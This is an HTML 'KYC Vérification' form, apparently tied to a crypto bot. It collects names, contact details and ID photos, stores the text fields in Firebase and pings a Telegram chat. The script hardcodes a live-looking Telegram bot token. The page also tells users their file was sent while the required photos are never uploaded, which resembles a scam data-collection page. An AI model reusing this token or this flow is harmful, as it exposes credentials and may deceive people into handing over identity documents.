<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KYC Vérification</title>
<style>
    *{ margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
    body{ background:#f5f5f5; padding:20px; }
    .container{ max-width:500px; margin:auto; background:#fff; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,.1); }
    h2{ text-align:center; margin-bottom:20px; }
    input{ width:100%; padding:12px; margin-top:10px; border:1px solid #ddd; border-radius:10px; }
    button{ width:100%; padding:14px; margin-top:15px; border:none; border-radius:10px; background:#007bff; color:#fff; font-size:16px; cursor:pointer; }
    button:hover{ opacity:.9; }
    .error{ color:red; margin-top:10px; text-align:center; font-weight:bold; }
    #loader{ display:none; text-align:center; margin-top:20px; }
    .spinner{ width:50px; height:50px; margin:auto; border:5px solid #ddd; border-top:5px solid #007bff; border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin{ 100%{ transform:rotate(360deg); } }
    #successBox{ display:none; text-align:center; padding:20px; }
    .success{ color:green; font-size:20px; margin-bottom:10px; }
</style>
</head>
<body>

<div class="container">
    <div id="formBox">
        <h2>Vérification KYC</h2>
        <input type="text" id="nom" placeholder="Nom">
        <input type="text" id="prenom" placeholder="Prénom">
        <input type="email" id="email" placeholder="Email">
        <input type="tel" id="numero" placeholder="Numéro">
        <label>Photo document (avant)</label><input type="file" id="photo1" accept="image/*">
        <label>Photo document (arrière)</label><input type="file" id="photo2" accept="image/*">
        <label>Selfie avec le document</label><input type="file" id="photo3" accept="image/*">
        <div class="error" id="error"></div>
        <button onclick="submitKYC()">Confirmer</button>
        <div id="loader"><div class="spinner"></div><p>Chargement...</p></div>
    </div>

    <div id="successBox">
        <div class="success">✅ Vérification en cours</div>
        <p>Votre dossier a été envoyé avec succès.</p>
        <p>Délai estimé : 15 minutes.</p>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const db = getDatabase(initializeApp({ databaseURL: "https://live-crypto-bot-default-rtdb.firebaseio.com" }));

    window.submitKYC = async () => {
        let nom = document.getElementById("nom").value.trim();
        let prenom = document.getElementById("prenom").value.trim();
        let email = document.getElementById("email").value.trim();
        let numero = document.getElementById("numero").value.trim();
        let p1 = document.getElementById("photo1").files[0];
        let p2 = document.getElementById("photo2").files[0];
        let p3 = document.getElementById("photo3").files[0];
        let error = document.getElementById("error");

        if(!nom || !prenom || !email.includes("@") || numero.length < 8) {
            error.innerHTML = "Veuillez remplir correctement tous les champs.";
            return;
        }
        if(!p1 || !p2 || !p3) {
            error.innerHTML = "Veuillez sélectionner les 3 photos obligatoires.";
            return;
        }

        error.innerHTML = "";
        document.getElementById("loader").style.display = "block";

        try {
            const userId = Date.now();
            await set(ref(db, 'users/' + userId), { nom, prenom, email, numero, status: "An atant" });

            // Telegram notification
            const botToken = "8650927753:AAENrCiVGi4m89bDj7fVz15Ax7nDUVnEYlc";
            const chatId = "-1003948852501";
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Nouvo KYC: ${prenom} ${nom}`);

            localStorage.setItem("kyc_status", "pending");
            localStorage.setItem("kyc_start_time", Date.now());

            document.getElementById("loader").style.display = "none";
            document.getElementById("formBox").style.display = "none";
            document.getElementById("successBox").style.display = "block";
        } catch (e) {
            error.innerHTML = "Erreur de connexion.";
            document.getElementById("loader").style.display = "none";
        }
    };
</script>

<script>
    window.onload = function(){
        let status = localStorage.getItem("kyc_status");
        let startTime = localStorage.getItem("kyc_start_time");
        if(status === "pending" && startTime) {
            if(Date.now() - startTime < 15 * 60 * 1000) {
                document.getElementById("formBox").style.display = "none";
                document.getElementById("successBox").style.display = "block";
            } else {
                localStorage.removeItem("kyc_status");
                localStorage.removeItem("kyc_start_time");
            }
        }
    }
</script>
</body>
</html>
